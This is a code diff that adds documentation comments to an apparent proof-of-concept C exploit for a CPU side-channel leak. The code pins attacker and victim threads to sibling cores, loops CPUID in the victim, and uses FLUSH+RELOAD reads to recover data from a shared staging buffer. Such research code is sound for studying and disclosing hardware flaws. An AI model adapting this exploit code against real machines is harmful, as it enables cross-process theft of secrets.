@@ -40,6 +40,10 @@ char *sample_strings[] = {
         "_You should not be able to read this.",
 };
 
+/**
+ * Moves the execution to the CPU with ID 'core_id'
+ * @param core_id The CPU to run on
+ */
 void set_processor_affinity(int core_id) {
     cpu_set_t cpuset;
     CPU_ZERO(&cpuset);
@@ -49,6 +53,11 @@ void set_processor_affinity(int core_id) {
     pthread_setaffinity_np(current_thread, sizeof(cpu_set_t), &cpuset);
 }
 
+/**
+ * Read /proc/cpuinfo to obtain information about the CPUs that share a physical core
+ * @param a Is filled with the ID of Same-Core CPU 1
+ * @param b Is filled with the ID of Same-Core CPU 2
+ */
 void get_same_core_cpus(int *a, int *b) {
     FILE *cpuinfo_fd = fopen("/proc/cpuinfo", "r");
     char *read_buffer = NULL;
@@ -94,6 +103,16 @@ void fill_result_buffer(char* buffer, int start, int end){
     }
 }
 
+/**
+ * Perform a vector read from 'start' to 'end'
+ * @param mem The FLUSH+RELOAD buffer
+ * @param _reps How often to repeat the read.
+ * @param buffer The result buffer, size >= 64
+ * @param start The starting index
+ * @param end The end index
+ * @param fill_complete_buffer Fills the complete 64byte result buffer with printable characters, regardless
+ * if a read was performed at a specific index or not
+ */
 void vector_read(void *mem, int _reps, char* buffer, int start, int end, int fill_complete_buffer) {
     set_processor_affinity(attacker_cpu1);
     memset(vector, 0, sizeof(vector[0]) * 64);
@@ -113,8 +132,11 @@ void vector_read(void *mem, int _reps, char* buffer, int start, int end, int fil
     else fill_result_buffer(buffer, start, end);
 }
 
-// Primes a segment of the staging buffer with a known cpuid value,
-// then returns the first byte of that segment
+/**
+ * Invoke CPUID with leaf 'leaf' once and return contents of %eax
+ * @param leaf The CPUID leaf
+ * @return The contents of %eax
+ */
 uint8_t prime_and_get_cpuid(uint32_t leaf){
     uint32_t ret;
     asm volatile(
@@ -125,7 +147,13 @@ uint8_t prime_and_get_cpuid(uint32_t leaf){
     return (uint8_t)(ret & 0xFF);
 }
 
-// Checks whether a specific position on the staging buffer contains a known reference value
+/**
+ * Check if the LFB at index 'pos' matches a known reference value
+ * @param mem The FLUSH+RELOAD buffer
+ * @param pos The index
+ * @param reference The reference value
+ * @return 1 if the value differs from 'reference', 0 otherwise
+ */
 int staging_buffer_byte_changed(void* mem, int pos, uint8_t reference){
     int success = 0;
     for(int i = 0; i < REPS*3; i++){
@@ -134,6 +162,11 @@ int staging_buffer_byte_changed(void* mem, int pos, uint8_t reference){
     return success == 0;
 }
 
+/**
+ * Invoke CPUID with leaf 'leaf' in an endless loop
+ * @param leaf The CPUID leaf
+ * @param cpu The Core-Id to run the endless loop on
+ */
 inline void *victim_cpuid(uint32_t leaf, int cpu) {
     set_processor_affinity(cpu);
     while (1) {
